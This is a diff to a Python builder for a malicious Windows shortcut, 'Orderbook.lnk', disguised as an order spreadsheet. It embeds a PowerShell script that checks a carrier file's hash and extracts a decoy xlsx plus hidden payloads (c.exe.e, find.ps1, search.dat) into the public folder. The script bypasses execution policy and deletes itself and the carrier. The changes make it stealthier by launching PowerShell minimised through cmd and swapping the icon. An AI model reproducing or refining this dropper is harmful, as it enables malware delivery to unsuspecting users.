@@ -120,7 +120,6 @@ if __name__ == "__main__":
 
     ## Step 2: Create the PowerShell script
     # Injected PowerShell Script Content
-    # TODO: At last, the lnk file should be self-deleted for clearance as well as the dummy file
     ps1_content = f"""
 using namespace System.IO
 
@@ -140,7 +139,7 @@ $md5 = (Get-FileHash -Path $dummy -Algorithm MD5).Hash
 if ($md5 -ne '{md5_hash}') {{ exit -1 }}
 
 $ofs=@(0, {offsets[data_paths[0]]},{offsets[data_paths[1]]},{offsets[data_paths[2]]},{offsets[data_paths[3]]})
-$fs=[System.IO.File]::OpenRead($dummy)
+$fs=[File]::OpenRead($dummy)
 $br=New-Object BinaryReader($fs)
 $tSize=$fs.Length
 for($i=0;$i-lt$ofs.Count-1;$i++){{
@@ -149,10 +148,8 @@ for($i=0;$i-lt$ofs.Count-1;$i++){{
     $len=$eOff-$sOff
     $fs.Seek($sOff,0)
     $outPath=if($i-eq 0){{Join-Path $lnk 'order.xlsx'}}else{{Join-Path $env:public @('c.exe.e','find.ps1','search.dat')[$i-1]}}
-    [System.IO.File]::WriteAllBytes($outPath,$br.ReadBytes($len))
+    [File]::WriteAllBytes($outPath,$br.ReadBytes($len))
 }}
-$br.Close()
-$fs.Close()
 
 # Remove myself and resource file
 Remove-Item -Path $dummy
@@ -174,15 +171,15 @@ Remove-Item -Path $me
 
     shortcut_name = "Orderbook.lnk"
     shortcut_path = os.path.join(current_directory, shortcut_name)
-    powershell_path = get_powershell_path()
-    arguments = f'-ExecutionPolicy Bypass -NoExit -Command "{compressed_ps1}"'
+    cmd_path = "C:\WINDOWS\system32\cmd.exe"
+    arguments = f'cmd /c start /min "" powershell -ExecutionPolicy Bypass -NoExit -Command "{compressed_ps1}"'
     working_directory = current_directory
-    icon_path = powershell_path 
+    icon_path = cmd_path
 
     # Create the lnk file shortcut
     create_lnk_shortcut(
         shortcut_path=shortcut_path,
-        target_path=powershell_path,
+        target_path=cmd_path,
         arguments=arguments,
         icon_path=icon_path
     )
